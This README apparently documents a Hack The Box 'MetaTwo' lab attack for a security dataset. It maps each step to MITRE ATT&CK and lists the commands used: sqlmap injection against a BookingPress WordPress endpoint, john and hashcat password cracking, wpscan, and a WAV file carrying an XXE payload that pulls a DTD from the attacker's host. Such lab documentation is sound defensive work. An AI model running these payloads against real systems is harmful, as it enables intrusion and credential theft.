# Cyber4ML_Framework application in "MetaTwo" HTB machine

## Framework application details

|Documentation|MITRE ATT&CK|Network Analysis|Log Analysis|
|-|-|-|-|
|Yes|Yes|Yes|Yes|

|Attacker Level|Environment|VPN|Attacker IP|Victim IP|
|-|-|-|-|-|
|Average|Linux|Yes|10.10.16.17|10.10.11.186|

**Average:** The knowledge, behavior and attack-timing of the attacker is average.

## Documentation

Documentation of the attack: [MetaTwo Documentation](https://github.com/stevendamianakis/HackTheBox_Writeups/blob/main/Machines/MetaTwo/README.MD)

## MITRE ATT&CK mapping

Below, we map the attack to the MITRE ATT&CK Enterprise framework.

| Tactic | Technique | Subtechnique | Command/Script | CVE/CWE |
| - | - | - | - | - |
| Initial Access | Exploit Public-Facing Application | - | (1) | CVE-2022-0739/CWE-89 |
| Execution | Command and Scripting Interpreter | Unix Shell | (1) | CVE-2022-0739/CWE-89 |
| Credential Access | Brute Force | Password Cracking | (2) | - |
| Initial Access | Valid Accounts | Local Accounts | - | - |
| Reconnaissance | Active Scanning | Vulnerability Scanning | (3) | - |
| Initial Access | Exploit Public-Facing Application | - | (4) | CVE-2021-29447/CWE-611 |
| Execution | Exploitation for Client Execution | Unix Shell | (4) | CVE-2021-29447/CWE-611 |
| Credential Access | Credentials from Password Stores | Password Managers | - | - |
| Privilege Escalation | Valid Accounts | Local Accounts | - | - |

#### Commands/Scripts
- (1)
```
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data="action=bookingpress_front_get_category_services&_wpnonce=35b4fc273d&category_id=33&total_service=1" -p "total_service" --dbs
```
- (2)
```
john hashes --wordlist=rockyou.txt
```

- (3)
```
wpscan --url http://metapress.htb
```

- (4)
```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.16.17:4444/xxe_attack.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

#### Alternative Commands/Scripts
- (2)
```
hashcat -m 400 -a 0 hashes rockyou.txt
```


## Network Analysis

Pcap file of the attack: [Capture File](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/MetaTwo/attack_capture.pcapng)

## Log Analysis
